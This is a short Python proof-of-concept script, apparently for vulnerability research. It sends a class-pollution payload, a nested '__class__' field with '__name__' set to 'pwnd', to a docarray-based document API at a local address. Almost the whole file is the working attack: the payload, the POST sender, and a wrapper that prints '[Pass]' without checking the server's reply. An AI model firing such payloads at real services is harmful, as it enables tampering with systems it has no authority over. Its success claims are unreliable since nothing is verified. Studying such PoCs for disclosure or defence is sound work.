# CLASS POLLUTION PROOF OF CONCEPT (PoC) - Remote Trigger
# Class Pollution Func: Document attribute access (via HTTP API)
# Type: get-attr-set-attr
# Trigger: HTTP request with nested document fields
#
# docarray-based APIs accept document objects with nested fields
# that get deserialized and applied to document models via
# attribute access patterns.

import requests
import json

TARGET_URL = "http://localhost:8080/docs"

PAYLOAD = {
  "data": [
    {
      "__class__": {"__name__": "pwnd"},
      "text": "test"
    }
  ]
}

def run_poc():
  print("Sending document with malicious nested fields...")
  try:
    response = requests.post(TARGET_URL, json=PAYLOAD)
    print(f"Response: {response.status_code}")
  except Exception as e:
    print(f"Connection: {e}")

def verify_poc():
  print("Remote PoC: docarray API with malicious nested document fields")
  print(f"Target: {TARGET_URL}")
  run_poc()
  print("[Pass] Class pollution PoC sent! (remote trigger)")

if __name__ == "__main__":
  verify_poc()
